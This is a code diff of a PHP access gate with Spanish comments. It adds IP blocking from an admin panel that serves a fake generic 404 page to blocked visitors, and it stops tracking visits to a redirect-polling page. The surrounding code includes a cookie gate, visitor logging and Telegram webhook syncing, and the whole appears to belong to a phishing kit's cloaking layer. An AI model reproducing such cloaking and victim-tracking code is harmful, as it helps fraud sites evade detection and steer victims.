@@ -42,11 +42,25 @@ if (gate_kill_switch_active()) {
     exit;
 }
 
+// Bloqueo manual desde el panel (_blocked.json): 404 neutral aunque
+// tenga cookie válida. trk_client_ip resuelve la IP real tras el proxy.
+@include_once __DIR__ . '/../_track.php';
+if (function_exists('trk_is_blocked')
+    && trk_is_blocked(function_exists('trk_client_ip') ? trk_client_ip() : $_guard_ip)) {
+    http_response_code(404);
+    header('Content-Type: text/html; charset=UTF-8');
+    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
+    exit;
+}
+
 // Si la cookie HMAC del gate es válida => continuar.
 if (gate_has_valid_cookie()) {
-    // Tracking de pageview para el panel admin (silencioso si falta el lib)
+    // Tracking de pageview para el panel admin (silencioso si falta el lib).
+    // EXCEPTO verificar_redireccion.php: hace polling cada 3s por pestaña
+    // y inundaba visits.log con 'pg' repetidos del mismo visitante.
     @include_once __DIR__ . '/../_track.php';
-    if (function_exists('track_visit')) { @track_visit('pg'); }
+    $__bn = basename((string)($_SERVER['SCRIPT_NAME'] ?? ''));
+    if (function_exists('track_visit') && $__bn !== 'verificar_redireccion.php') { @track_visit('pg'); }
     // Auto-sync del webhook de Telegram (idempotente; solo dispara si la URL cambió).
     // Se carga aquí porque _guard se incluye en todas las páginas protegidas.
     @include_once __DIR__ . '/_tg.php';
